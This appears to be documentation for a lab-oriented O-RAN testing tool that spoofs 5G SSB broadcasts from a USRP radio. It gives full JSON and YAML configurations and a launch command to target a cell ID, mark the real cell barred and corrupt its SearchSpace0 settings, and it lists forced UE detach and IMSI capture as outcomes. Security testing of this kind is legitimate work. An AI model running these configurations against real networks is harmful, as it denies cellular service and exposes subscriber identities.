SSB Spoofing Attack
===================

Introduction
------------

SSB (Synchronization Signal Block) Spoofing is an attack where a malicious device transmits伪造 SSB signals to impersonate a legitimate gNB, tricking UEs into connecting to a rogue cell. This can be used to:

- Deny service by marking legitimate cells as barred
- Disrupt UE initial access by corrupting CORESET0 or SearchSpace0 configurations
- Perform gNB impersonation for man-in-the-middle attacks

The SSB Spoofer scans for a target PCI, then transmits spoofed SSB bursts with attacker-controlled MIB/NR-NS-PDCCH-Config parameters.

Configuration
-------------

**MCP Server (start_component):**

Use the ``ssb_spoofer`` component type with the following JSON configuration:

.. code-block:: json

   {
     "id": "ocudu_band3_ssb_spoofer",
     "rf": {
       "device_name": "uhd",
       "device_args": "type=b200",
       "rx_freq_hz": 1842050000,
       "tx_freq_hz": 1842050000,
       "srate_hz": 23040000,
       "rx_gain_db": 40.0,
       "tx_gain_db": 60.0
     },
     "ssb": {
       "pattern": "A",
       "scs_khz": 15,
       "periodicity_ms": 10,
       "beta_pss": 1.0,
       "beta_sss": 1.0,
       "beta_pbch": 1.0,
       "beta_pbch_dmrs": 1.0
     },
     "attack": {
       "target_pci": 1,
       "scan_for_target": true,
       "modify_cell_barred": true,
       "cell_barred_value": true,
       "modify_coreset0_idx": false,
       "coreset0_idx_value": 15,
       "modify_ss0_idx": true,
       "ss0_idx_value": 15,
       "modify_intra_freq_resel": false,
       "tx_power_offset_db": 0.0,
       "continuous_tx": true,
       "max_bursts": 0,
       "burst_interval_us": 9000,
       "burst_length_ms": 1
     },
     "operation": {
       "scan_duration_sec": 30.0,
       "log_level": "info",
       "save_samples": false
     }
   }

**Configuration parameters:**

RF Section
^^^^^^^^^^

- ``device_name``: RF device driver (``uhd`` for USRP)
- ``device_args``: Device arguments (e.g., ``type=b200``)
- ``rx_freq_hz``: RX center frequency in Hz
- ``tx_freq_hz``: TX center frequency in Hz
- ``srate_hz``: Sample rate (e.g., 23.04 MHz)
- ``rx_gain_db``: RX gain in dB
- ``tx_gain_db``: TX gain in dB

SSB Section
^^^^^^^^^^^

- ``pattern``: SSB pattern (``A`` for FR1 < 3GHz, ``B`` for > 3GHz)
- ``scs_khz``: Subcarrier spacing (15 or 30 kHz)
- ``periodicity_ms``: SSB periodicity for scanning
- ``beta_pss`` / ``beta_sss`` / ``beta_pbch`` / ``beta_pbch_dmrs``: Power allocation (0-1)

Attack Section
^^^^^^^^^^^^^^

- ``target_pci``: Target Physical Cell ID
- ``scan_for_target``: Scan for specific PCI (true) or any PCI (false)
- ``modify_cell_barred``: Mark the cell as barred to deny service
- ``modify_coreset0_idx``: Corrupt CORESET0 configuration
- ``coreset0_idx_value``: Invalid CORESET0 index (e.g., 15)
- ``modify_ss0_idx``: Corrupt SearchSpace0 configuration
- ``ss0_idx_value``: Invalid SearchSpace0 index (e.g., 15)
- ``max_bursts``: Maximum burst count (0 = unlimited)
- ``burst_interval_us``: Delay between bursts in microseconds
- ``burst_length_ms``: Number of SSBs per burst (1 SSB = 1 ms subframe)

Attack Metrics
--------------

- Forced UE detach (cell barred)
- UE connection failures (corrupted SIB1 decoding)
- gNB overload from repeated attach attempts
- IMSI capture via rogue cell

Running the Test
----------------

**1. Controller Spec**

Use the dedicated ``ssb-spoofer`` controller spec (``configs/ssb-spoofer.yaml``):

.. code-block:: yaml

   enable_cli: false

   api_auth:
     - name: "mcp-server"
       token: "testing_token"
       scopes:
         - "start_from_json"
         - "start"
         - "schemas/ssb_spoofer"
         - "list"
         - "status"
         - "stop"
       allowed_components: ["sniffer", "ssb_spoofer"]

   build_spec:
     - component: "oran-testing/ssb-spoofer"
       branch: "main"
       pull: true
     - component: "oran-testing/rtue"
       branch: "main"
       pull: true

   run_spec:
     - component: "oran-testing/rtue"
       worker_thread: "rtue"
       name: "victim_ue"
       config_file: "configs/srsran/ue_uhd.conf"
       sleep_ms: 3000
       rf:
         type: "b200"
     - component: "oran-testing/ssb-spoofer"
       worker_thread: "ssb_spoofer"
       name: "ocudu_band3_ssb_spoofer"
       config_file: "configs/ssb_spoofer/srs_band3.yaml"
       rf:
         type: "b200"

.. code-block:: bash

   CONTROLLER_SPEC=configs/ssb-spoofer.yaml docker compose up -d

**2. Start the SSB Spoofing attack via the MCP server:**

.. code-block:: json

   {
     "component_type": "ssb_spoofer",
     "config_json": {
       "id": "band3_ssb_spoof",
       "rf": {"device_name": "uhd", "device_args": "type=b200",
              "rx_freq_hz": 1842050000, "tx_freq_hz": 1842050000,
              "srate_hz": 23040000, "rx_gain_db": 40.0, "tx_gain_db": 60.0},
       "ssb": {"pattern": "A", "scs_khz": 15, "periodicity_ms": 10},
       "attack": {"target_pci": 1, "scan_for_target": true,
                  "modify_cell_barred": true, "modify_ss0_idx": true,
                  "ss0_idx_value": 15, "continuous_tx": true},
       "operation": {"scan_duration_sec": 30.0, "log_level": "info"}
     },
     "rf_config": {"type": "b200"}
   }

Monitor with ``get_component_health`` and ``get_component_logs``. Stop with ``stop_component``.